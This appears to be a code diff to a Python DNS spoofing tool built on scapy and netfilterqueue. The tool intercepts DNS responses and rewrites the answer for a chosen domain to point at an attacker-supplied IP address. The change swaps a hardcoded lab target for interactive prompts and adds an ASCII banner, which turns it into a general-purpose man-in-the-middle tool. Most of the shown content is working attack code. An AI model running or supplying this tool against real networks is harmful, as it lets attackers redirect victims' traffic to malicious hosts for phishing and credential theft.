@@ -8,10 +8,10 @@ def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.DNSRR):
         qname = scapy_packet[scapy.DNSQR].qname
-        site = "testhtml5.vulnweb.com"
+        site = website
         if site.encode() in qname:
-            print("[+] Spoofing target...")
-            answer = scapy.DNSRR(rrname=qname, rdata="10.10.10.6")
+            print("\n[+] Spoofing target...")
+            answer = scapy.DNSRR(rrname=qname, rdata=ip_address)
             scapy_packet[scapy.DNS].an = answer
             scapy_packet[scapy.DNS].ancount = 1
             del scapy_packet[scapy.IP].len
@@ -21,6 +21,19 @@ def process_packet(packet):
             packet.set_payload(bytes(scapy_packet))
     packet.accept()
 
+print('''
+██████╗░███╗░░██╗░██████╗██████╗░░█████╗░░█████╗░███████╗░░░██████╗░██╗░░░██╗
+██╔══██╗████╗░██║██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝░░░██╔══██╗╚██╗░██╔╝
+██║░░██║██╔██╗██║╚█████╗░██████╔╝██║░░██║██║░░██║█████╗░░░░░██████╔╝░╚████╔╝░
+██║░░██║██║╚████║░╚═══██╗██╔═══╝░██║░░██║██║░░██║██╔══╝░░░░░██╔═══╝░░░╚██╔╝░░
+██████╔╝██║░╚███║██████╔╝██║░░░░░╚█████╔╝╚█████╔╝██║░░░░░██╗██║░░░░░░░░██║░░░
+╚═════╝░╚═╝░░╚══╝╚═════╝░╚═╝░░░░░░╚════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝░░░░░░░░╚═╝░░░''')
+
+website = input("\nWhat website do you want to spoof? > ")
+
+ip_address = input("\nWhat IP address do you want to spoof it as? > ")
+
+print("\n[+] Starting to spoof...")
 
 #Main
 queue = netfilterqueue.NetfilterQueue()
